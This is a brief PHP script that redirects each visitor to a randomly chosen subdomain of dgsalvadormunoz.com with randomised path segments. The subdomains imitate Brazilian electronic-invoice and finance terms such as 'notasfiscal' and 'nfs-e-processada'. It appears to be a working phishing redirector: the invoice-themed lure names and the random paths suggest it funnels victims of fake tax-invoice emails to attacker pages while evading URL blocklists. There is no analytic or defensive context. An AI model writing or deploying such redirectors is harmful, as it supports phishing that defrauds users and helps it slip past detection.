<?php

$subdomains = [
    'notasfiscal',
    'administracao',
    'emisao-nota',
    'nfs-e-processada',
    'financeiro'
];

function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
}

// escolhe 1 subdomínio aleatório por acesso
$randomSubdomain = $subdomains[array_rand($subdomains)];

$url = 'https://' . $randomSubdomain . '.dgsalvadormunoz.com/'
    . generateSegment(8) . '/'
    . generateSegment(8);

header("Location: " . $url);
exit();

?>
